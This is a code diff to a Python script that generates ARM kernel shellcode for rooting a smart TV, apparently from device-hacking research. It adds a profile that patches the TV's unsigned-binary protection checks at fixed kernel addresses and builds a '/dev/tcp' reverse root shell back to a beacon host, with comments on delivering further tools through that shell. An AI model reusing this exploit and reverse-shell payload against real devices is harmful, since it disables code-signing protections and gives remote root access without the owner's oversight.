@@ -72,6 +72,27 @@ PROFILES = {
             "[ -n $S ]&&{ export P2=${S%/*};/bin/cat $S|/bin/bash -s;}"
         ),
     },
+    # uep2: instead of stubbing the verifier entry, force its three reads of
+    # the UEP status global (0xc069342c) to 0. That is the exact state the
+    # live zeroing experiment proved allows unsigned binaries, made permanent
+    # and immune to the ~1-minute external re-arm of the flag.
+    "nikem-uep2": {
+        "coherent": 0xC001D808,
+        "umh": 0xC003B87C,
+        "park": 0xC05330E0,
+        "uep": None,
+        "uep_gates": (0xC01DE10C, 0xC01DE23C, 0xC01DE524),
+        "path": "/bin/bash",
+        # Beacon-only stage: the stick's proven job is patching UEP and
+        # opening the root shell. Kit delivery goes through tools/feed-4444.sh
+        # (heredocs into the beacon shell) and the root command agent - every
+        # p2-mount chain tried on this TV failed. For reference, the storaged
+        # p1/p2 mount serialization makes waiting for /opt/media unwinnable
+        # (p1's mount hangs in UMH_WAIT_PROC until the ~60s storage timeout
+        # kills the session); a direct mount is `mkdir -p /tmp/p2;
+        # /bin/mount -t vfat /dev/sda2 /tmp/p2` but was never verified.
+        "command": "",
+    },
 }
 
 
@@ -81,13 +102,29 @@ def emit(profile, beacon=None):
         host, port = beacon.rsplit(":", 1)
         if not port.isdigit() or any(c not in "0123456789abcdefABCDEF:." for c in host):
             raise SystemExit("--beacon must be a numeric IP address and port")
+        # The marker doubles as the UEP-patch confirmation: the echo runs
+        # only after the stage's patch stores + cache flush completed.
         p["command"] = (
             f"exec 9<>/dev/tcp/{host}/{port};"
-            "echo KERNEL-STAGE-OK >&9;"
-            "/bin/bash -i <&9 >&9 2>&9 & exec 9>&-;" + p["command"]
+            "echo UEP DOWN >&9;"
+            "/bin/bash -i <&9 >&9 2>&9 &" + p["command"]
         )
     patch = ""
-    if p["uep"] is not None:
+    if p.get("uep_gates"):
+        stores = "\n".join(
+            f"    ldr     r0, uep_gate{i + 1}\n"
+            f"    str     r1, [r0]"
+            for i in range(len(p["uep_gates"]))
+        )
+        patch = (
+            "    ldr     r1, uep_gate_word\n"
+            f"{stores}\n"
+            "    add     r1, r0, #4\n"
+            "    ldr     r0, uep_gate1\n"
+            "    ldr     r3, coherent_addr\n"
+            "    blx     r3\n"
+        )
+    elif p["uep"] is not None:
         patch = f"""
     ldr     r0, uep_addr
     ldr     r1, uep_word0
@@ -140,7 +177,10 @@ saved_ip_addr: .word 0xc0008d00
 """ + (f"""uep_addr:       .word 0x{p['uep']:08x}
 uep_word0:      .word 0xe3a00002
 uep_word1:      .word 0xe12fff1e
-""" if p["uep"] is not None else "")
+""" if p["uep"] is not None else "") + ("".join(
+        f"uep_gate{i + 1}:   .word 0x{addr:08x}\n"
+        for i, addr in enumerate(p.get("uep_gates", ()))
+    ) + "uep_gate_word: .word 0xe3a03000\n" if p.get("uep_gates") else "")
 
 
 def main():
